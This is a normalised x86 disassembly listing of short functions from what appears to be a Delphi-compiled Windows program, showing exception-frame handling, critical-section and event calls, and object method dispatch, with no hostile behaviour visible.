sub_419f6c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_419f74
xor eax eax
retn
sub_419fbd
jmp sub_403a2c
sub_419fc4
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41a0d7
jmp sub_403a2c
sub_41a0de
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a16c
jmp sub_403a2c
sub_41a173
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a243
jmp sub_403a2c
sub_41a24a
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a300
jmp sub_403a2c
sub_41a307
pop esi
pop ecx
pop ebp
retn
sub_41a38c
jmp sub_403a2c
sub_41a393
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3b0
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_41a3a9
jmp sub_403a2c
sub_41a3b0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a43c
jmp sub_403a2c
sub_41a459
jmp sub_403a2c
sub_41a460
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a49c
retn
sub_41a51f
jmp sub_403a2c
sub_41a526
mov eax [ ebp - 0x8 ]
call sub_41d0c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a54b
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_41a544
jmp sub_403a2c
sub_41a54b
mov esp ebp
pop ebp
retn
sub_41a59b
jmp sub_403a2c
sub_41a5a2
pop esi
pop ecx
pop ebp
retn
sub_41a5f5
jmp sub_403a2c
sub_41a5fc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a604
retn
sub_41a67f
jmp sub_403a2c
sub_41a686
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a723
jmp sub_403a2c
sub_41a72a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a747
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_41a740
jmp sub_403a2c
sub_41a747
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a74c
retn
sub_41a7c6
jmp sub_403a2c
sub_41a7cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a7d4
mov eax edx
mov edx ecx
call sub_4080b0
retn
sub_41a7e0
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41a7f8
sub_41a870
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41a8e0
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41a8fc
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41aaf0
mov eax [ eax + 0x18 ]
retn
sub_41aaf4
mov eax [ eax + 0x14 ]
retn
sub_41ab90
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41ad9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40272c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41add8
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41adf0
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41ae04
mov edx sub_41adf0
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41ae4c
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_4080b0
retn
mov eax edx
mov edx ecx
call sub_408078
retn
sub_41aee8
retn
sub_41b1e0
jmp sub_403a2c
sub_41b1e7
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41b248
jmp sub_403a2c
sub_41b24f
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b258
xor ecx ecx
call sub_41b260
retn
sub_41b2b0
jmp sub_403a2c
sub_41b2b7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b2f8
mov eax [ eax + 0x4 ]
call sub_408690
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b308
mov eax [ eax + 0x4 ]
call sub_4086bc
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b344
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41b4ed
jmp sub_403a2c
sub_41b54c
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41b5dc
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41b62c
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41b817
jmp sub_403a2c
sub_41b81e
mov esp ebp
pop ebp
retn
sub_41b8c8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
retn
sub_41b950
mov [ eax + 0x18 ] edx
retn
sub_41bacc
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_414e9c
retn
sub_41bb53
jmp sub_403a2c
sub_41bb5a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bc06
jmp sub_403a2c
sub_41bc0d
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bdb1
jmp sub_403a2c
sub_41be03
jmp sub_403a2c
sub_41be22
jmp sub_403a2c
sub_41be29
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41be48
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41be41
jmp sub_403a2c
sub_41be48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41beeb
jmp sub_403a2c
sub_41bf73
jmp sub_403a2c
sub_41bf80
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
pop ebx
retn
sub_41bf98
mov eax [ rw-data ]
call sub_41bf80
retn
sub_41bfd0
push ebx
call sub_414cd0
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41bf98
sub_41c13d
jmp sub_403a2c
sub_41c144
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_4040ac
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41c264
jmp sub_403a2c
sub_41c26b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c362
jmp sub_403a2c
sub_41c37f
jmp sub_403a2c
sub_41c386
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c484
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41ae68
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41c548
push ebx
mov ebx eax
mov eax ebx
call sub_41defc
cmp al 0x9
sete al
pop ebx
retn
sub_41c5a7
jmp sub_403a2c
sub_41c5ae
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41c654
jmp sub_403a2c
sub_41c65b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c8da
jmp sub_403778
sub_41c906
jmp sub_403778
sub_41c9a8
jmp sub_403778
sub_41ca4b
jmp sub_403778
sub_41cc23
jmp sub_403778
sub_41cc65
jmp sub_403a2c
sub_41cc95
jmp sub_403a2c
sub_41cc9c
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cd0b
jmp sub_403a2c
sub_41cde2
jmp sub_403a2c
sub_41cde9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d0bc
mov dl 0x1
call sub_41c024
retn
sub_41d1fd
jmp sub_403a2c
sub_41d204
pop ebx
mov esp ebp
pop ebp
retn
sub_41d20c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41e00c
mov eax [ rw-data ]
call sub_41bf80
pop ebp
retn
sub_41d386
jmp sub_4038a4
sub_41d3ad
jmp sub_4038a4
sub_41d3f8
jmp sub_403a2c
sub_41d3ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d4df
jmp sub_403a2c
sub_41d4e6
mov esp ebp
pop ebp
retn
sub_41d59e
jmp sub_403a2c
sub_41d5a5
pop ecx
pop ecx
pop ebp
retn
sub_41d8a7
jmp sub_403a2c
sub_41d8ae
pop ebx
mov esp ebp
pop ebp
retn
sub_41db53
jmp sub_403a2c
sub_41db5a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4032b0
retn
sub_41db73
jmp sub_403a2c
sub_41db97
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403778
sub_41dbce
jmp sub_403778
sub_41dc0d
jmp sub_403a2c
sub_41dc14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc36
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_4040d0
retn
sub_41dc2f
jmp sub_403a2c
sub_41dc36
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dcbd
jmp sub_403778
sub_41dcea
jmp sub_403a2c
sub_41dcf1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41dcfc
push ecx
mov edx esp
mov ecx 0x4
call sub_41c4c0
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41bf80
sub_41de09
jmp sub_403a2c
sub_41de10
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41deef
jmp sub_403a2c
sub_41def6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41df4c
jmp sub_403a2c
sub_41df53
pop ebx
pop ecx
pop ebp
retn
sub_41e19b
jmp sub_403a2c
sub_41e1a2
pop ecx
pop ecx
pop ebp
retn
sub_41e1e5
jmp sub_403a2c
sub_41e1ec
pop ebx
pop ecx
pop ebp
retn
sub_41e288
jmp sub_403a2c
sub_41e28f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e33d
jmp sub_403a2c
sub_41e344
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e350
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41e5ab
jmp sub_403a2c
sub_41e5b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e5d7
mov eax [ ebp - 0x8 ]
call sub_4032b0
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_41e5d0
jmp sub_403a2c
sub_41e5d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e5fc
lea eax [ ebp - 0x1c ]
call sub_405944
lea eax [ ebp - 0x18 ]
call sub_4040ac
retn
sub_41e5f5
jmp sub_403a2c
sub_41e5fc
pop ebx
mov esp ebp
pop ebp
retn
sub_41e80e
jmp sub_403a2c
sub_41e815
pop ebx
mov esp ebp
pop ebp
retn
sub_41e848
mov eax [ eax + 0x30 ]
call sub_418854
retn
sub_41e8b8
call sub_41e9e8
retn
sub_41e8fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b950
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41e9d7
jmp sub_403a2c
sub_41e9de
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41e9e8
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41b0cc
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41ea00
test dl dl
je r-xdata
mov dl 0x8
call sub_420b6c
retn
mov dl 0x9
call sub_420b6c
retn
sub_41ea57
jmp sub_403a2c
sub_41ea5e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41eaf6
jmp sub_403a2c
sub_41eafd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ec9b
jmp sub_403a2c
sub_41eca2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41efe3
jmp sub_403a2c
sub_41f025
jmp sub_403a2c
sub_41f084
jmp sub_403a2c
sub_41f08b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f2f0
mov dl 0x1
call sub_420b6c
retn
sub_41f2f8
xor edx edx
call sub_420b6c
retn
sub_41f3f1
jmp sub_403a2c
sub_41f5c7
jmp sub_403a2c
sub_41f5ce
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f79c
jmp sub_403a2c
sub_41f7a3
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f879
jmp sub_403a2c
sub_41f880
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f997
jmp sub_403a2c
sub_41f99e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41fb58
jmp sub_403a2c
sub_41fb5f
pop ecx
pop ebp
retn
sub_41fbea
jmp sub_403a2c
sub_41fbf1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fc58
jmp sub_403a2c
sub_41fc5f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fcdd
jmp sub_403a2c
sub_41fce4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd01
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_41fcfa
jmp sub_403a2c
sub_41fd01
pop ebx
pop ecx
pop ebp
retn
sub_41fdbc
jmp sub_403a2c
sub_41fdc3
pop ebx
pop ecx
pop ebp
retn
sub_41fe99
jmp sub_403a2c
sub_41fea0
pop ecx
pop ebp
retn
sub_41fea4
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_41ffab
jmp sub_403a2c
sub_41ffb2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420159
jmp sub_403a2c
sub_4201d8
jmp sub_403a2c
sub_4201df
mov esp ebp
pop ebp
retn
sub_4202ad
jmp sub_403a2c
sub_4202b4
pop ebx
mov esp ebp
pop ebp
retn
sub_420367
jmp sub_403a2c
sub_42036e
pop ebx
mov esp ebp
pop ebp
retn
sub_4203cd
jmp sub_403a2c
sub_4203d4
mov esp ebp
pop ebp
retn
sub_420839
jmp sub_403a2c
sub_420893
jmp sub_403a2c
sub_4208a4
jmp sub_403778
sub_420900
jmp sub_403a2c
sub_420907
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420966
jmp sub_403a2c
sub_42096d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420974
mov edx rw-data
mov ecx 0x4
call sub_41e914
retn
sub_420aa9
jmp sub_403a2c
sub_420ab0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420b5e
jmp sub_403a2c
sub_420b65
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420ba4
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40d008
sub_420bd8
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_420bf0
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_420bfc
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_420bf0
sub_420c18
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_420c24
push rw-data
call InterlockedIncrement
retn
sub_420c30
push rw-data
call InterlockedDecrement
retn
sub_420d46
jmp sub_403778
sub_420d75
jmp sub_403a2c
sub_420dab
jmp sub_403a2c
sub_420db2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420dd1
push rw-data
call LeaveCriticalSection
retn
sub_420dca
jmp sub_403a2c
sub_420dd1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420e1d
jmp sub_403778
sub_420f2e
jmp sub_403a2c
sub_420f35
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_420fbc
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_42129c
sub_421036
jmp sub_403a2c
sub_42103d
pop ebx
mov esp ebp
pop ebp
retn
sub_42105c
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_421070
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_42105c
call sub_4211f0
sub_421195
jmp sub_403a2c
sub_42119c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4211bb
push rw-data
call LeaveCriticalSection
retn
sub_4211b4
jmp sub_403a2c
sub_4211bb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_4211d2
jmp sub_403a2c
sub_421218
cmp dl [ eax + 0xe ]
je r-xdata
retn
test dl dl
je r-xdata
call sub_42129c
call sub_421230
jmp r-xdata
sub_42127d
jmp sub_403778
sub_4212c4
mov [ eax + 0xd ] 0x1
retn
sub_421434
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_421610
sub_421494
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d00c
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_4214a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d00c
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_4214bc
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41f224
retn
sub_4214c8
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41f224
retn
sub_421770
xor eax eax
retn
sub_421774
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42177c
xor eax eax
retn
sub_421780
retn
sub_421784
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404100
pop esi
pop ebx
retn
sub_421798
mov eax [ eax + 0x4 ]
retn
sub_42179c
retn
sub_4217a0
xor eax eax
retn
sub_4217a4
retn
sub_4217a8
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_4217b4
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_4217c0
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_4217cc
retn
sub_4217d0
xchg edx eax
call sub_41ccb0
retn
sub_4217d8
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_421860
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_4034ac
pop esi
retn
sub_421874
retn
sub_421954
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404100
pop esi
pop ebx
retn
sub_421994
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_421ae0
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4034e0
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_421af8
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_421b80
retn
sub_421bc8
retn
sub_421c00
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_421c18
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421e3c
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_4034ac
pop esi
pop ebx
retn
sub_421c60
mov al 0x1
retn
sub_421c64
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421c6c
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_421d14
xor eax eax
retn
sub_421d18
retn
sub_421d44
retn
sub_421ddc
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_421df0
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_418854
retn
sub_421f37
jmp sub_403778
sub_421f3c
mov ebx 0x1
call sub_403ae0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421f9f
jmp sub_403778
sub_421fa4
mov ebx 0x80030103
call sub_403ae0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_422022
jmp sub_403778
sub_422027
mov ebx 0x80030009
call sub_403ae0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_422085
jmp sub_403778
sub_42208a
mov ebx 0x8000ffff
call sub_403ae0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_422255
jmp sub_403a2c
sub_422266
jmp sub_403778
sub_42226b
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422294
lea eax [ ebp + 0xc ]
call sub_405944
retn
sub_42228d
jmp sub_403a2c
sub_422294
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_4222a0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4222ac
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_4222b8
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_4222c4
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_422333
jmp sub_403778
sub_422338
mov esi 0x8000ffff
call sub_403ae0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42234c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_4223b9
jmp sub_403a2c
sub_4223c0
mov eax [ rw-data ]
call sub_4032b0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4223d0
call sub_417f98
retn
sub_422498
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_42263c
jmp sub_403a2c
sub_422643
pop ebp
retn
sub_4226d1
jmp sub_403a2c
sub_4226d8
pop ebp
retn
sub_4229a1
jmp sub_403a2c
sub_4229a8
pop ebp
retn
sub_4229ac
sub [ rw-data ] 0x1
retn
sub_423664
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_4236d8
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_42374c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423758
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_423838
jmp sub_403a2c
sub_42383f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4238cf
jmp sub_403a2c
sub_423961
jmp sub_403a2c
sub_423968
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4239cc
jmp sub_403a2c
sub_4239d3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423a3b
jmp sub_403a2c
sub_423a42
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423ae5
jmp sub_403a2c
sub_423aec
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423f44
push 0x33
mov ecx rw-data
call sub_4182d4
retn
sub_423f54
push 0x33
mov ecx rw-data
call sub_418294
retn
sub_423f64
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_423f88
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_42415c
push 0x11
mov ecx rw-data
call sub_418294
retn
sub_42429c
push ebx
mov ebx eax
mov eax ebx
call sub_423f64
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_424356
jmp sub_403a2c
sub_42435d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423f88
retn
sub_424373
jmp sub_403a2c
sub_42438c
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_4243e9
jmp sub_403a2c
sub_4243f0
pop ebx
pop ecx
pop ebp
retn
sub_424569
jmp sub_403a2c
sub_424591
jmp sub_403a2c
sub_424598
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_424604
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404310
pop esi
pop ebx
retn
sub_424678
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_4245d4
push eax
call MulDiv
neg eax
pop ebx
retn
sub_4246b4
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_4246ec
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_42471c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_42483a
jmp sub_403a2c
sub_424841
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423f88
retn
sub_424857
jmp sub_403a2c
sub_4248cd
jmp sub_403a2c
sub_4248d4
pop ebx
pop ecx
pop ebp
retn
sub_4248d8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_42498e
jmp sub_403a2c
sub_4249a0
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_4034ac
sub_4249b4
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_4249e4
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_424af3
jmp sub_403a2c
sub_424afa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423f88
retn
sub_424b10
jmp sub_403a2c
sub_424b89
jmp sub_403a2c
sub_424b90
pop ebx
pop ecx
pop ebp
retn
sub_424cc1
jmp sub_403a2c
sub_424cd4
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_42508f
jmp sub_403a2c
sub_425096
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250b8
mov eax [ ebp - 0x8 ]
call sub_428308
call sub_425540
retn
sub_4250b1
jmp sub_403a2c
sub_4250b8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425540
retn
sub_4250d6
jmp sub_403a2c
sub_4252d4
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_425530
jmp sub_403a2c
sub_425537
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
